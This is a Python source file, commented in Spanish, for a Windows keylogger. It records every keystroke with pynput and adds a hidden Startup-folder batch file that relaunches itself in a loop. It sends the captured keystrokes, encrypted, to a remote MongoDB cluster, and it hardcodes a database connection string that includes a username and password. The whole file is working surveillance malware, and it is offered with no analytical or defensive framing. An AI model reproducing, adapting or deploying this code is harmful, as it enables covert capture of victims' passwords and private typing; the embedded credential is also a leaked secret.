import os
import threading
import time
from pynput import keyboard
from pymongo import MongoClient
import datetime
from cryptography.fernet import Fernet  # Instalar: pip install cryptography

# Ruta del archivo Python actual
current_script = os.path.abspath(__file__)

# Ruta del archivo .bat para inicio automático
startup_folder = os.getenv('APPDATA') + r'\Microsoft\Windows\Start Menu\Programs\Startup'
bat_file_path = os.path.join(startup_folder, 'run_keylogger.bat')

# Clave de cifrado para los datos
encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)

# Configuración de MongoDB
mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
client = MongoClient(mongo_uri)
db = client["keylogger_db"]
collection = db["keystrokes2"]

# Control de sesiones y variables de estado
keystrokes = []
current_session_id = None
start_time = time.time()
session_timeout = 600  # 10 minutos de inactividad para considerar una nueva sesión

def create_startup_file():
    bat_content = f'''@echo off
                        where python >nul 2>nul
                        if %ERRORLEVEL% neq 0 (
                            echo Python no está instalado. Instale Python.
                            exit /b
                        )

                        rem Instalar dependencias
                        python -m pip install --upgrade pip
                        pip install pynput pymongo cryptography

                        set "PYTHON_SCRIPT={current_script}"
                        powershell -windowstyle hidden -command "try {{ python '{current_script}' }} catch {{ exit 1 }}"

                        :inicio
                        python %PYTHON_SCRIPT%
                        goto inicio
'''
    with open(bat_file_path, 'w') as bat_file:
        bat_file.write(bat_content)
    print(f'Archivo de inicio creado en: {bat_file_path}')

def initialize_new_session():
    """Inicia una nueva sesión cuando se detecta inactividad."""
    global current_session_id
    current_session_id = datetime.datetime.utcnow().isoformat()

def on_press(key):
    """Maneja la captura de teclas con categorización."""
    global start_time
    categorized_key = categorize_key(key)
    keystrokes.append(categorized_key)
    start_time = time.time()  # Actualizar el tiempo de última actividad

def categorize_key(key):
    """Clasifica teclas en categorías y caracteres específicos."""
    try:
        return {'type': 'character', 'value': key.char}
    except AttributeError:
        special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '\t',
            keyboard.Key.backspace: 'BACKSPACE',
            keyboard.Key.shift: 'SHIFT',
            keyboard.Key.ctrl: 'CTRL',
            keyboard.Key.alt: 'ALT',
            keyboard.Key.esc: 'ESCAPE'
        }
        return {'type': 'special', 'value': special_keys.get(key, 'UNKNOWN')}

def store_keystrokes():
    """Guarda los datos de teclas presionadas en MongoDB si se cumplen ciertas condiciones."""
    global start_time
    while True:
        time.sleep(5)  # Verificar cada 5 segundos

        # Comprobar si se cumplen las condiciones de almacenamiento
        if keystrokes and (len(keystrokes) >= 100 or (time.time() - start_time) >= session_timeout):
            # Encriptar los datos y almacenarlos
            encrypted_data = cipher_suite.encrypt(str(keystrokes).encode())
            timestamp = datetime.datetime.utcnow()

            collection.insert_one({
                "session_id": current_session_id,
                "timestamp": timestamp,
                "encrypted_text": encrypted_data
            })

            # Reiniciar la sesión después de almacenar los datos
            keystrokes.clear()
            initialize_new_session()

def main():
    """Configuración principal del keylogger."""
    initialize_new_session()  # Comenzar la primera sesión
    store_thread = threading.Thread(target=store_keystrokes)
    store_thread.daemon = True
    store_thread.start()

    # Escuchar las teclas en segundo plano
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    if not os.path.isfile(bat_file_path):
        create_startup_file()
    main()
